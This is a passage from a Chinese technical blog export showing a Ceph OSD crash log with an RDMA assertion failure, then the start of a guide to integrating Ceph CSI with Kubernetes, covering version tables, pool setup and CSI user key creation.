0x55bcc845ace0<br></code></pre></td></tr></table></figure><h2 id="4-3、osd-进程异常"><a href="#4-3、osd-进程异常" class="headerlink" title="4.3、osd 进程异常"></a>4.3、osd 进程异常</h2><p>当通过 cephadm 完成集群部署，配置变更后，仍出现该问题，目前问题不明。</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">2025-08-10T07:02:24.266+0000 7f8177a94740  0 &lt;cls&gt; /home/jenkins-build/build/workspace/ceph-build/ARCH/x86_64/AVAILABLE_ARCH/x86_64/AVAILABLE_DIST/centos9/DIST/centos9/MACHINE_SIZE/gigantic/release/19.2.3/rpm/el9/BUILD/ceph-19.2.3/src/cls/cephfs/cls_cephfs.cc:201: loa<br>ding cephfs<br>2025-08-10T07:02:24.267+0000 7f8177a94740  0 _get_class not permitted to load sdk<br>2025-08-10T07:02:24.270+0000 7f8177a94740  0 _get_class not permitted to load lua<br>2025-08-10T07:02:24.270+0000 7f8177a94740  0 osd.4 54 crush map has features 288514051259236352, adjusting msgr requires <span class="hljs-keyword">for</span> clients<br>2025-08-10T07:02:24.271+0000 7f8177a94740  0 osd.4 54 crush map has features 288514051259236352 was 8705, adjusting msgr requires <span class="hljs-keyword">for</span> mons<br>2025-08-10T07:02:24.271+0000 7f8177a94740  0 osd.4 54 crush map has features 3314933000852226048, adjusting msgr requires <span class="hljs-keyword">for</span> osds<br>2025-08-10T07:02:24.271+0000 7f8177a94740  1 osd.4 54 check_osdmap_features require_osd_release unknown -&gt; squid<br>2025-08-10T07:02:24.271+0000 7f8177a94740  0 osd.4 54 load_pgs<br>2025-08-10T07:02:24.271+0000 7f8177a94740  0 osd.4 54 load_pgs opened 0 pgs<br>2025-08-10T07:02:24.271+0000 7f8177a94740 -1 osd.4 54 log_to_monitors <span class="hljs-literal">true</span><br>2025-08-10T07:02:24.634+0000 7f8177a94740  1 bluestore(/var/lib/ceph/osd/ceph-4) collect_metadata devices span numa nodes 0<br>2025-08-10T07:02:25.468+0000 7f8177a94740  0 osd.4 54 <span class="hljs-keyword">done</span> with init, starting boot process<br>2025-08-10T07:02:25.468+0000 7f8177a94740  1 osd.4 54 start_boot<br>2025-08-10T07:02:25.469+0000 7f8177a94740  1 osd.4 54 maybe_override_options_for_qos osd_max_backfills <span class="hljs-built_in">set</span> to 1<br>2025-08-10T07:02:25.469+0000 7f8177a94740  1 osd.4 54 maybe_override_options_for_qos osd_recovery_max_active <span class="hljs-built_in">set</span> to 0<br>2025-08-10T07:02:25.469+0000 7f8177a94740  1 osd.4 54 maybe_override_options_for_qos osd_recovery_max_active_hdd <span class="hljs-built_in">set</span> to 3<br>2025-08-10T07:02:25.469+0000 7f8177a94740  1 osd.4 54 maybe_override_options_for_qos osd_recovery_max_active_ssd <span class="hljs-built_in">set</span> to 10<br>2025-08-10T07:02:25.469+0000 7f8177a94740  1 osd.4 54 maybe_override_max_osd_capacity_for_qos default_iops: 21500.00 cur_iops: 26142.86. Skip OSD benchmark <span class="hljs-built_in">test</span>.<br>2025-08-10T07:02:25.474+0000 7f816a035640  1 osd.4 54 set_numa_affinity storage numa node 0<br>2025-08-10T07:02:25.474+0000 7f816a035640 -1 osd.4 54 set_numa_affinity unable to identify public interface <span class="hljs-string">&#x27;&#x27;</span> numa node: (2) No such file or directory<br>2025-08-10T07:02:25.474+0000 7f816a035640  1 osd.4 54 set_numa_affinity not setting numa affinity<br>2025-08-10T07:02:25.474+0000 7f816a035640  1 bluestore(/var/lib/ceph/osd/ceph-4) collect_metadata devices span numa nodes 0<br>2025-08-10T07:02:25.474+0000 7f816a035640  1 bluestore(/var/lib/ceph/osd/ceph-4) collect_metadata devices span numa nodes 0<br>2025-08-10T07:02:25.680+0000 7f816c039640  1 osd.4 54 tick checking mon <span class="hljs-keyword">for</span> new map<br>2025-08-10T07:02:26.468+0000 7f8161e13640  1 osd.4 61 state: booting -&gt; active<br>2025-08-10T07:02:27.167+0000 7f8174a2b640 -1 Infiniband to_dead failed to send a beacon: (11) Resource temporarily unavailable<br>2025-08-10T07:02:33.507+0000 7f8173a17640 -1 Infiniband modify_qp_to_rtr failed to transition to RTR state: (22) Invalid argument<br>2025-08-10T07:02:33.509+0000 7f8173a17640 -1 /home/jenkins-build/build/workspace/ceph-build/ARCH/x86_64/AVAILABLE_ARCH/x86_64/AVAILABLE_DIST/centos9/DIST/centos9/MACHINE_SIZE/gigantic/release/19.2.3/rpm/el9/BUILD/ceph-19.2.3/src/msg/async/rdma/RDMAConnectedSocketImpl.<br>cc: In <span class="hljs-keyword">function</span> <span class="hljs-string">&#x27;void RDMAConnectedSocketImpl::handle_connection()&#x27;</span> thread 7f8173a17640 <span class="hljs-keyword">time</span> 2025-08-10T07:02:33.508351+0000<br>/home/jenkins-build/build/workspace/ceph-build/ARCH/x86_64/AVAILABLE_ARCH/x86_64/AVAILABLE_DIST/centos9/DIST/centos9/MACHINE_SIZE/gigantic/release/19.2.3/rpm/el9/BUILD/ceph-19.2.3/src/msg/async/rdma/RDMAConnectedSocketImpl.cc: 231: FAILED ceph_assert(!r)<br><br> ceph version 19.2.3 (c92aebb279828e9c3c1f5d24613efca272649e62) squid (stable)<br> 1: (ceph::__ceph_assert_fail(char const*, char const*, int, char const*)+0x113) [0x5627245fc85d]<br> 2: /usr/bin/ceph-osd(+0x401a14) [0x5627245fca14]<br> 3: /usr/bin/ceph-osd(+0x45b95a) [0x56272465695a]<br> 4: (EventCenter::process_events(unsigned int, std::chrono::duration&lt;unsigned long, std::ratio&lt;1l, 1000000000l&gt; &gt;*)+0x1cd) [0x562724e4d78d]<br> 5: /usr/bin/ceph-osd(+0xc53086) [0x562724e4e086]<br> 6: /lib64/libstdc++.so.6(+0xdbae4) [0x7f81782a8ae4]<br> 7: /lib64/libc.so.6(+0x8a4da) [0x7f8177f584da]<br> 8: <span class="hljs-built_in">clone</span>()<br><br>2025-08-10T07:02:33.512+0000 7f8173a17640 -1 *** Caught signal (Aborted) **<br> <span class="hljs-keyword">in</span> thread 7f8173a17640 thread_name:msgr-worker-2<br><br> ceph version 19.2.3 (c92aebb279828e9c3c1f5d24613efca272649e62) squid (stable)<br> 1: /lib64/libc.so.6(+0x3ebf0) [0x7f8177f0cbf0]<br> 2: /lib64/libc.so.6(+0x8c21c) [0x7f8177f5a21c]<br> 3: raise()<br> 4: abort()<br> 5: (ceph::__ceph_assert_fail(char const*, char const*, int, char const*)+0x169) [0x5627245fc8b3]<br> 6: /usr/bin/ceph-osd(+0x401a14) [0x5627245fca14]<br> 7: /usr/bin/ceph-osd(+0x45b95a) [0x56272465695a]<br> 8: (EventCenter::process_events(unsigned int, std::chrono::duration&lt;unsigned long, std::ratio&lt;1l, 1000000000l&gt; &gt;*)+0x1cd) [0x562724e4d78d]<br> 9: /usr/bin/ceph-osd(+0xc53086) [0x562724e4e086]<br> 10: /lib64/libstdc++.so.6(+0xdbae4) [0x7f81782a8ae4]<br> 11: /lib64/libc.so.6(+0x8a4da) [0x7f8177f584da]<br> 12: <span class="hljs-built_in">clone</span>()<br> NOTE: a copy of the executable, or `objdump -rdS &lt;executable&gt;` is needed to interpret this.<br><br>--- begin dump of recent events ---<br> -2984&gt; 2025-08-10T07:02:19.690+0000 7f8177a94740  5 asok(0x5627273ca000) register_command assert hook 0x562727300ce0<br> -2983&gt; 2025-08-10T07:02:19.690+0000 7f8177a94740  5 asok(0x5627273ca000) register_command abort hook 0x562727300ce0<br> -2982&gt; 2025-08-10T07:02:19.690+0000 7f8177a94740  5 asok(0x5627273ca000) register_command leak_some_memory hook 0x562727300ce0<br> -2981&gt; 2025-08-10T07:02:19.690+0000 7f8177a94740  5 asok(0x5627273ca000) register_command perfcounters_dump hook 0x562727300ce0<br> -2980&gt; 2025-08-10T07:02:19.690+0000 7f8177a94740  5 asok(0x5627273ca000) register_command 1 hook 0x562727300ce0<br> -2979&gt; 2025-08-10T07:02:19.690+0000 7f8177a94740  5 asok(0x5627273ca000) register_command perf dump hook 0x562727300ce0<br> -2978&gt; 2025-08-10T07:02:19.690+0000 7f8177a94740  5 asok(0x5627273ca000) register_command perfcounters_schema hook 0x562727300ce0<br> -2977&gt; 2025-08-10T07:02:19.690+0000 7f8177a94740  5 asok(0x5627273ca000) register_command perf histogram dump hook 0x562727300ce0<br> -2976&gt; 2025-08-10T07:02:19.690+0000 7f8177a94740  5 asok(0x5627273ca000) register_command 2 hook 0x562727300ce0<br> -2975&gt; 2025-08-10T07:02:19.690+0000 7f8177a94740  5 asok(0x5627273ca000) register_command perf schema hook 0x562727300ce0<br> -2974&gt; 2025-08-10T07:02:19.690+0000 7f8177a94740  5 asok(0x5627273ca000) register_command counter dump hook 0x562727300ce0<br> -2973&gt; 2025-08-10T07:02:19.690+0000 7f8177a94740  5 asok(0x5627273ca000) register_command counter schema hook 0x562727300ce0<br> -2972&gt; 2025-08-10T07:02:19.690+0000 7f8177a94740  5 asok(0x5627273ca000) register_command perf histogram schema hook 0x562727300ce0<br> -2971&gt; 2025-08-10T07:02:19.690+0000 7f8177a94740  5 asok(0x5627273ca000) register_command perf reset hook 0x562727300ce0<br> -2970&gt; 2025-08-10T07:02:19.690+0000 7f8177a94740  5 asok(0x5627273ca000) register_command config show hook 0x562727300ce0<br> -2969&gt; 2025-08-10T07:02:19.690+0000 7f8177a94740  5 asok(0x5627273ca000) register_command config <span class="hljs-built_in">help</span> hook 0x562727300ce0<br> -2968&gt; 2025-08-10T07:02:19.690+0000 7f8177a94740  5 asok(0x5627273ca000) register_command config <span class="hljs-built_in">set</span> hook 0x562727300ce0<br> -2967&gt; 2025-08-10T07:02:19.690+0000 7f8177a94740  5 asok(0x5627273ca000) register_command config <span class="hljs-built_in">unset</span> hook 0x562727300ce0<br> -2966&gt; 2025-08-10T07:02:19.690+0000 7f8177a94740  5 asok(0x5627273ca000) register_command config get hook 0x562727300ce0<br> -2965&gt; 2025-08-10T07:02:19.690+0000 7f8177a94740  5 asok(0x5627273ca000) register_command config diff hook 0x562727300ce0<br> -2964&gt; 2025-08-10T07:02:19.690+0000 7f8177a94740  5 asok(0x5627273ca000) register_command config diff get hook 0x562727300ce0<br> -2963&gt; 2025-08-10T07:02:19.690+0000 7f8177a94740  5 asok(0x5627273ca000) register_command injectargs hook 0x562727300ce0<br></code></pre></td></tr></table></figure><h1 id="五、参考资料"><a href="#五、参考资料" class="headerlink" title="五、参考资料"></a>五、参考资料</h1><ul><li><a href="https://enterprise-support.nvidia.com/s/article/bring-up-ceph-rdma---developer-s-guide">https://enterprise-support.nvidia.com/s/article/bring-up-ceph-rdma---developer-s-guide</a></li><li><a href="https://jianyue.tech/posts/devops-ceph-rdma/">https://jianyue.tech/posts/devops-ceph-rdma/</a></li><li><a href="https://forum.proxmox.com/threads/ceph-in-pve-7-3-can-not-working-with-rdma-roce.132637/">https://forum.proxmox.com/threads/ceph-in-pve-7-3-can-not-working-with-rdma-roce.132637/</a></li><li><a href="https://docs.ceph.com/en/latest/rados/configuration/network-config-ref/#confval-ms_type">https://docs.ceph.com/en/latest/rados/configuration/network-config-ref/#confval-ms_type</a></li><li><a href="https://www.spinics.net/lists/ceph-users/msg69925.html">https://www.spinics.net/lists/ceph-users/msg69925.html</a></li><li><a href="https://www.spinics.net/lists/ceph-users/msg69930.html">https://www.spinics.net/lists/ceph-users/msg69930.html</a></li><li><a href="https://www.spinics.net/lists/ceph-users/msg75006.html">https://www.spinics.net/lists/ceph-users/msg75006.html</a></li><li><a href="https://www.spinics.net/lists/ceph-users/msg75014.html">https://www.spinics.net/lists/ceph-users/msg75014.html</a></li><li><a href="https://www.spinics.net/lists/ceph-users/msg75034.html">https://www.spinics.net/lists/ceph-users/msg75034.html</a></li><li><a href="https://www.spinics.net/lists/ceph-users/msg75180.html">https://www.spinics.net/lists/ceph-users/msg75180.html</a></li><li><a href="https://stackoverflow.com/questions/71080451/why-error-shows-usr-include-c-8-bits-stl-vector-h932-while-start-using-cha">https://stackoverflow.com/questions/71080451/why-error-shows-usr-include-c-8-bits-stl-vector-h932-while-start-using-cha</a></li><li><a href="https://github.com/VDrift/vdrift/issues/163">https://github.com/VDrift/vdrift/issues/163</a></li><li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1573253">https://bugzilla.redhat.com/show_bug.cgi?id=1573253</a></li><li><a href="https://tracker.ceph.com/issues/56863">https://tracker.ceph.com/issues/56863</a></li><li><a href="https://tracker.ceph.com/issues/56789">https://tracker.ceph.com/issues/56789</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Ceph </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ceph CSI 对接 K8S 指南</title>
      <link href="/2024/03/05/ceph-csi/"/>
      <url>/2024/03/05/ceph-csi/</url>
      
        <content type="html"><![CDATA[<h1 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h1><h2 id="1-1、Ceph-CSI-介绍"><a href="#1-1、Ceph-CSI-介绍" class="headerlink" title="1.1、Ceph CSI 介绍"></a>1.1、Ceph CSI 介绍</h2><p>Ceph CSI 插件实现了支持 CSI 的容器编排器 (CO) 与 Ceph 集群之间的接口。它们支持动态配置 Ceph 卷并将其附加到工作负载。项目地址: <a href="https://github.com/ceph/ceph-csi">https://github.com/ceph/ceph-csi</a> 。该仓库包含用于 RBD、CephFS 和 Kubernetes sidecar 部署 YAML 的 Ceph 容器存储接口 (CSI) 驱动程序，以支持 CSI 功能：provisioner、attacher、resizer、driver-registrar 和 snapper。</p><p>本文基于 Ceph CSI <a href="https://github.com/ceph/ceph-csi/tree/v3.14.1">v3.14.1</a> 版本进行测试。</p><p><strong>Ceph CSI 驱动与测试过的 Kubernetes 版本信息表:</strong> (参考 <a href="https://github.com/ceph/ceph-csi/tree/v3.14.1?tab=readme-ov-file#known-to-work-co-platforms">known-to-work-co-platforms</a>)</p><table><thead><tr><th align="center">Ceph CSI 版本</th><th align="center">Kubernetes 版本</th></tr></thead><tbody><tr><td align="center">v3.14.1</td><td align="center">v1.30、v1.31、v1.32</td></tr><tr><td align="center">v3.14.0</td><td align="center">v1.30、v1.31、v1.32</td></tr><tr><td align="center">v3.13.1</td><td align="center">v1.29、v1.30、v1.31</td></tr><tr><td align="center">v3.13.0</td><td align="center">v1.29、v1.30、v1.31</td></tr></tbody></table><p><strong>Ceph-CSI RBD 功能和可用版本信息表:</strong> (参考 <a href="https://github.com/ceph/ceph-csi/tree/v3.14.1?tab=readme-ov-file#ceph-csi-features-and-available-versions">ceph-csi-features-and-available-versions</a>)</p><table><thead><tr><th align="center">特性</th><th align="center">状态</th><th align="center">CSI 驱动版本</th><th align="center">CSI 规范版本</th><th align="center">Ceph 集群版本</th><th align="center">Kubernetes 版本</th></tr></thead><tbody><tr><td align="center">动态&#x2F;取消配置块模式 RWO 卷</td><td align="center">正式版本</td><td align="center">&gt;&#x3D; v1.0.0</td><td align="center">&gt;&#x3D; v1.0.0</td><td align="center">Pacific (&gt;&#x3D;v16.2.0)</td><td align="center">&gt;&#x3D; v1.14.0</td></tr><tr><td align="center">动态&#x2F;取消配置块模式 RWX 卷</td><td align="center">正式版本</td><td align="center">&gt;&#x3D; v1.0.0</td><td align="center">&gt;&#x3D; v1.0.0</td><td align="center">Pacific (&gt;&#x3D;v16.2.0)</td><td align="center">&gt;&#x3D; v1.14.0</td></tr><tr><td align="center">动态&#x2F;取消配置文件模式 RWO 卷</td><td align="center">正式版本</td><td align="center">&gt;&#x3D; v1.0.0</td><td align="center">&gt;&#x3D; v1.0.0</td><td align="center">Pacific (&gt;&#x3D;v16.2.0)</td><td align="center">&gt;&#x3D; v1.14.0</td></tr><tr><td align="center">创建&#x2F;删除快照</td><td align="center">正式版本</td><td align="center">&gt;&#x3D; v1.0.0</td><td align="center">&gt;&#x3D; v1.0.0</td><td align="center">Pacific (&gt;&#x3D;v16.2.0)</td><td align="center">&gt;&#x3D; v1.17.0</td></tr><tr><td align="center">从快照配置卷</td><td align="center">正式版本</td><td align="center">&gt;&#x3D; v1.0.0</td><td align="center">&gt;&#x3D; v1.0.0</td><td align="center">Pacific (&gt;&#x3D;v16.2.0)</td><td align="center">&gt;&#x3D; v1.17.0</td></tr><tr><td align="center">从另一个卷配置卷</td><td align="center">正式版本</td><td align="center">&gt;&#x3D; v1.0.0</td><td align="center">&gt;&#x3D; v1.0.0</td><td align="center">Pacific (&gt;&#x3D;v16.2.0)</td><td align="center">&gt;&#x3D; v1.16.0</td></tr><tr><td align="center">文件模式卷的卷&#x2F;PV 指标</td><td align="center">正式版本</td><td align="center">&gt;&#x3D; v1.2.0</td><td align="center">&gt;&#x3D; v1.1.0</td><td align="center">Pacific (&gt;&#x3D;v16.2.0)</td><td align="center">&gt;&#x3D; v1.15.0</td></tr><tr><td align="center">区块模式卷的卷&#x2F;PV 指标</td><td align="center">正式版本</td><td align="center">&gt;&#x3D; v1.2.0</td><td align="center">&gt;&#x3D; v1.1.0</td><td align="center">Pacific (&gt;&#x3D;v16.2.0)</td><td align="center">&gt;&#x3D; v1.21.0</td></tr><tr><td align="center">扩大卷</td><td align="center">Beta版本</td><td align="center">&gt;&#x3D; v2.0.0</td><td align="center">&gt;&#x3D; v1.1.0</td><td align="center">Pacific (&gt;&#x3D;v16.2.0)</td><td align="center">&gt;&#x3D; v1.15.0</td></tr><tr><td align="center">拓扑感知配置支持</td><td align="center">Alpha版本</td><td align="center">&gt;&#x3D; v2.1.0</td><td align="center">&gt;&#x3D; v1.1.0</td><td align="center">Pacific (&gt;&#x3D;v16.2.0)</td><td align="center">&gt;&#x3D; v1.14.0</td></tr><tr><td align="center">从快照配置文件模式 ROX 卷</td><td align="center">Alpha版本</td><td align="center">&gt;&#x3D; v3.0.0</td><td align="center">&gt;&#x3D; v1.0.0</td><td align="center">Pacific (&gt;&#x3D;v16.2.0)</td><td align="center">&gt;&#x3D; v1.17.0</td></tr><tr><td align="center">从另一个卷配置文件模式 ROX 卷</td><td align="center">Alpha版本</td><td align="center">&gt;&#x3D; v3.0.0</td><td align="center">&gt;&#x3D; v1.0.0</td><td align="center">Pacific (&gt;&#x3D;v16.2.0)</td><td align="center">&gt;&#x3D; v1.16.0</td></tr><tr><td align="center">从快照配置块模式 ROX 卷</td><td align="center">Alpha版本</td><td align="center">&gt;&#x3D; v3.0.0</td><td align="center">&gt;&#x3D; v1.0.0</td><td align="center">Pacific (&gt;&#x3D;v16.2.0)</td><td align="center">&gt;&#x3D; v1.17.0</td></tr><tr><td align="center">从另一个卷提供块模式 ROX 卷</td><td align="center">Alpha版本</td><td align="center">&gt;&#x3D; v3.0.0</td><td align="center">&gt;&#x3D; v1.0.0</td><td align="center">Pacific (&gt;&#x3D;v16.2.0)</td><td align="center">&gt;&#x3D; v1.16.0</td></tr><tr><td align="center">动态&#x2F;取消文件模式 RWOP 卷</td><td align="center">Alpha版本</td><td align="center">&gt;&#x3D; v3.5.0</td><td align="center">&gt;&#x3D; v1.5.0</td><td align="center">Pacific (&gt;&#x3D;v16.2.0)</td><td align="center">&gt;&#x3D; v1.22.0</td></tr><tr><td align="center">动态&#x2F;取消配置块模式 RWOP 卷</td><td align="center">Alpha版本</td><td align="center">&gt;&#x3D; v3.5.0</td><td align="center">&gt;&#x3D; v1.5.0</td><td align="center">Pacific (&gt;&#x3D;v16.2.0)</td><td align="center">&gt;&#x3D; v1.22.0</td></tr></tbody></table><p><strong>Ceph-CSI CephFS 功能和可用版本信息表:</strong> (参考 <a href="https://github.com/ceph/ceph-csi/tree/v3.14.1?tab=readme-ov-file#ceph-csi-features-and-available-versions">ceph-csi-features-and-available-versions</a>)</p><table><thead><tr><th align="center">特性</th><th align="center">状态</th><th align="center">CSI 驱动版本</th><th align="center">CSI 规范版本</th><th align="center">Ceph 集群版本</th><th align="center">Kubernetes 版本</th></tr></thead><tbody><tr><td align="center">动态&#x2F;取消配置文件模式 RWO 卷</td><td align="center">正式版本</td><td align="center">&gt;&#x3D; v1.1.0</td><td align="center">&gt;&#x3D; v1.0.0</td><td align="center">Pacific (&gt;&#x3D;v16.2.0)</td><td align="center">&gt;&#x3D; v1.14.0</td></tr><tr><td align="center">动态&#x2F;取消配置文件模式 RWX 卷</td><td align="center">正式版本</td><td align="center">&gt;&#x3D; v1.1.0</td><td align="center">&gt;&#x3D; v1.0.0</td><td align="center">Pacific (&gt;&#x3D;v16.2.0)</td><td align="center">&gt;&#x3D; v1.14.0</td></tr><tr><td align="center">创建和删除快照</td><td align="center">正式版本</td><td align="center">&gt;&#x3D; v3.1.0</td><td align="center">&gt;&#x3D; v1.0.0</td><td align="center">Pacific (&gt;&#x3D;v16.2.0)</td><td align="center">&gt;&#x3D; v1.17.0</td></tr><tr><td align="center">从快照配置卷</td><td align="center">正式版本</td><td align="center">&gt;&#x3D; v3.1.0</td><td align="center">&gt;&#x3D; v1.0.0</td><td align="center">Pacific (&gt;&#x3D;v16.2.0)</td><td align="center">&gt;&#x3D; v1.17.0</td></tr><tr><td align="center">从另一个卷配置卷</td><td align="center">正式版本</td><td align="center">&gt;&#x3D; v3.1.0</td><td align="center">&gt;&#x3D; v1.0.0</td><td align="center">Pacific (&gt;&#x3D;v16.2.0)</td><td align="center">&gt;&#x3D; v1.16.0</td></tr><tr><td align="center">文件模式卷的卷&#x2F;PV 指标</td><td align="center">正式版本</td><td align="center">&gt;&#x3D; v1.2.0</td><td align="center">&gt;&#x3D; v1.1.0</td><td align="center">Pacific (&gt;&#x3D;v16.2.0)</td><td align="center">&gt;&#x3D; v1.15.0</td></tr><tr><td align="center">扩大卷</td><td align="center">Beta版本</td><td align="center">&gt;&#x3D; v2.0.0</td><td align="center">&gt;&#x3D; v1.1.0</td><td align="center">Pacific (&gt;&#x3D;v16.2.0)</td><td align="center">&gt;&#x3D; v1.15.0</td></tr><tr><td align="center">动态&#x2F;取消配置文件模式 ROX 卷</td><td align="center">Alpha版本</td><td align="center">&gt;&#x3D; v3.0.0</td><td align="center">&gt;&#x3D; v1.0.0</td><td align="center">Pacific (&gt;&#x3D;v16.2.0)</td><td align="center">&gt;&#x3D; v1.14.0</td></tr><tr><td align="center">动态&#x2F;取消配置文件模式 RWOP 卷</td><td align="center">Alpha版本</td><td align="center">&gt;&#x3D; v3.5.0</td><td align="center">&gt;&#x3D; v1.5.0</td><td align="center">Pacific (&gt;&#x3D;v16.2.0)</td><td align="center">&gt;&#x3D; v1.22.0</td></tr><tr><td align="center">创建和删除卷组快照</td><td align="center">Alpha版本</td><td align="center">&gt;&#x3D; v3.11.0</td><td align="center">&gt;&#x3D; v1.9.0</td><td align="center">Squid (&gt;&#x3D;v19.0.0)</td><td align="center">&gt;&#x3D; v1.31.0</td></tr></tbody></table><p><strong>Ceph-CSI NFS 功能和可用版本信息表:</strong> (参考 <a href="https://github.com/ceph/ceph-csi/tree/v3.14.1?tab=readme-ov-file#ceph-csi-features-and-available-versions">ceph-csi-features-and-available-versions</a>)</p><table><thead><tr><th align="center">特性</th><th align="center">状态</th><th align="center">CSI 驱动版本</th><th align="center">CSI 规范版本</th><th align="center">Ceph 集群版本</th><th align="center">Kubernetes 版本</th></tr></thead><tbody><tr><td align="center">动态&#x2F;取消配置文件模式 RWO 卷</td><td align="center">Alpha版本</td><td align="center">&gt;&#x3D; v3.6.0</td><td align="center">&gt;&#x3D; v1.0.0</td><td align="center">Pacific (&gt;&#x3D;v16.2.0)</td><td align="center">&gt;&#x3D; v1.14.0</td></tr><tr><td align="center">动态&#x2F;取消配置文件模式 RWX 卷</td><td align="center">Alpha版本</td><td align="center">&gt;&#x3D; v3.6.0</td><td align="center">&gt;&#x3D; v1.0.0</td><td align="center">Pacific (&gt;&#x3D;v16.2.0)</td><td align="center">&gt;&#x3D; v1.14.0</td></tr><tr><td align="center">动态&#x2F;取消配置文件模式 ROX 卷</td><td align="center">Alpha版本</td><td align="center">&gt;&#x3D; v3.6.0</td><td align="center">&gt;&#x3D; v1.0.0</td><td align="center">Pacific (&gt;&#x3D;v16.2.0)</td><td align="center">&gt;&#x3D; v1.14.0</td></tr><tr><td align="center">动态&#x2F;取消配置文件模式 RWOP 卷</td><td align="center">Alpha版本</td><td align="center">&gt;&#x3D; v3.6.0</td><td align="center">&gt;&#x3D; v1.5.0</td><td align="center">Pacific (&gt;&#x3D;v16.2.0)</td><td align="center">&gt;&#x3D; v1.22.0</td></tr><tr><td align="center">扩大卷</td><td align="center">Alpha版本</td><td align="center">&gt;&#x3D; v3.7.0</td><td align="center">&gt;&#x3D; v1.1.0</td><td align="center">Pacific (&gt;&#x3D;v16.2.0)</td><td align="center">&gt;&#x3D; v1.15.0</td></tr><tr><td align="center">创建和删除快照</td><td align="center">Alpha版本</td><td align="center">&gt;&#x3D; v3.7.0</td><td align="center">&gt;&#x3D; v1.1.0</td><td align="center">Pacific (&gt;&#x3D;v16.2.0)</td><td align="center">&gt;&#x3D; v1.17.0</td></tr><tr><td align="center">从快照配置卷</td><td align="center">Alpha版本</td><td align="center">&gt;&#x3D; v3.7.0</td><td align="center">&gt;&#x3D; v1.1.0</td><td align="center">Pacific (&gt;&#x3D;v16.2.0)</td><td align="center">&gt;&#x3D; v1.17.0</td></tr><tr><td align="center">从另一个卷配置卷</td><td align="center">Alpha版本</td><td align="center">&gt;&#x3D; v3.7.0</td><td align="center">&gt;&#x3D; v1.1.0</td><td align="center">Pacific (&gt;&#x3D;v16.2.0)</td><td align="center">&gt;&#x3D; v1.16.0</td></tr></tbody></table><h2 id="1-2、资源拓扑情况"><a href="#1-2、资源拓扑情况" class="headerlink" title="1.2、资源拓扑情况"></a>1.2、资源拓扑情况</h2><p>本文中机器资源部署拓扑情况如下所示:</p><table><thead><tr><th align="center">机器节点</th><th align="center">机器IP地址</th><th align="center">角色</th></tr></thead><tbody><tr><td align="center">node01</td><td align="center">10.10.0.1</td><td align="center">CephServer</td></tr><tr><td align="center">node02</td><td align="center">10.10.0.2</td><td align="center">CephServer</td></tr><tr><td align="center">node03</td><td align="center">10.10.0.3</td><td align="center">CephServer&#x2F;minikube</td></tr></tbody></table><p><strong>字段解释:</strong></p><ul><li><code>CephServer</code>: 其中部署了 Ceph Monitor&#x2F;Manager&#x2F;OSD等组件的节点，使用的 Ceph 版本为 <a href="https://github.com/ceph/ceph/tree/v19.2.1">v19.2.1</a> 。</li><li><code>minikube</code>: 搭建 K8S 测试集群的节点；</li></ul><h1 id="二、配置-Ceph-环境"><a href="#二、配置-Ceph-环境" class="headerlink" title="二、配置 Ceph 环境"></a>二、配置 Ceph 环境</h1><p>我们可以使用 cephadm 来搭建部署一个新的集群，并在已部署的 Ceph 集群之上确保初始化如下配置环境，用于支持后续通过 Ceph CSI 组件来访问 Ceph 集群数据。</p><h2 id="2-1、初始化数据访问环境"><a href="#2-1、初始化数据访问环境" class="headerlink" title="2.1、初始化数据访问环境"></a>2.1、初始化数据访问环境</h2><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 初始化 CephFS 环境</span><br><span class="hljs-comment"># 如果集群未创建 MDS 组件并启用 CephFS ，可使用下面的命令创建并启用</span><br><span class="hljs-comment"># 创建一个名为 cephfs 的文件系统，对应的两个存储池为 cephfs.cephfs.data 和 cephfs.cephfs.meta</span><br>ceph fs volume create cephfs<br>ceph fs status<br><br><span class="hljs-comment"># 初始化 CephRBD 环境</span><br><span class="hljs-comment"># 创建并初始化一个名为 cephrbd 的存储池</span><br>ceph osd pool create cephrbd<br>ceph osd pool application <span class="hljs-built_in">enable</span> cephrbd rbd<br>rbd pool init cephrbd<br><br><span class="hljs-comment"># 创建一个 RBD Image ，用于支持 Ceph CSI 静态配置 RBD</span><br>rbd create -p cephrbd --image cephrbdimg01 --size 5G<br></code></pre></td></tr></table></figure><h2 id="2-2、新增访问密钥"><a href="#2-2、新增访问密钥" class="headerlink" title="2.2、新增访问密钥"></a>2.2、新增访问密钥</h2><p>按照 <a href="https://github.com/ceph/ceph-csi/blob/v3.14.1/docs/capabilities.md#cephfs">Ceph-CSI CephFS Capabilities</a> 和 <a href="https://github.com/ceph/ceph-csi/blob/v3.14.1/docs/capabilities.md#rbd">Ceph-CSI CephRBD Capabilities</a> 中所描述的访问密钥的所需能力，我们执行如下操作创建对应密钥。</p><p><strong>要求的权限能力:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># for CephFS</span><br>mgr <span class="hljs-string">&quot;allow rw&quot;</span><br>osd <span class="hljs-string">&quot;allow rw tag cephfs metadata=&lt;cephfs_name&gt;, allow rw tag cephfs data=&lt;cephfs_name&gt;&quot;</span><br>mds <span class="hljs-string">&quot;allow r fsname=&lt;cephfs_name&gt; path=/volumes, allow rws fsname=&lt;cephfs_name&gt; path=/volumes/csi&quot;</span><br>mon <span class="hljs-string">&quot;allow r fsname=&lt;cephfs_name&gt;&quot;</span><br><br><span class="hljs-comment"># for CephRBD</span><br>mgr <span class="hljs-string">&quot;profile rbd pool=&lt;rbd_pool_name&gt;&quot;</span><br>osd <span class="hljs-string">&quot;profile rbd pool=&lt;rbd_pool_name&gt;&quot;</span><br>mon <span class="hljs-string">&quot;profile rbd&quot;</span><br></code></pre></td></tr></table></figure><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 新增 CephFS 访问用户</span><br><span class="hljs-comment"># 创建一个 csifsuser 的用户，赋予其访问名为 cephfs 文件系统的能力</span><br>ceph auth get-or-create client.csifsuser \<br>     mgr <span class="hljs-string">&quot;allow rw&quot;</span> \<br>     osd <span class="hljs-string">&quot;allow rw tag cephfs metadata=cephfs, allow rw tag cephfs data=cephfs&quot;</span> \<br>     mds <span class="hljs-string">&quot;allow r fsname=cephfs 